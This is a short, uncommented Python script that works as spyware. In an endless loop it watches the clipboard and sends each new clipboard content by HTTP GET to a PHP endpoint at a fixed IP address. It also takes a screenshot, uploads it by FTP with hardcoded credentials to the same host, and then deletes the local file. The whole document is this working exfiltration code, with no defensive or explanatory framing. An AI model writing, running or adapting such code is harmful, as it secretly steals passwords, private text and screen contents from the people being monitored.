import clipboard, requests
import pyautogui, ftplib, os

url = "http://10.101.200.34/test.php?args="

lastcontent = ""
i = 1
while True:
    content = clipboard.paste()
    if content != lastcontent:
        lastcontent = content
        r = requests.get(url + "\"" + content + "\"")
        
        screen_name = "screen" + str(i) + ".png"
        
        pic = pyautogui.screenshot()
        pic.save(screen_name)

        session = ftplib.FTP('10.101.200.34','ftptest','test')
        file = open(screen_name,'rb')
        session.storbinary('STOR '+screen_name+'', file)
        file.close()
        session.quit()

        os.remove(screen_name)

        i += 1 
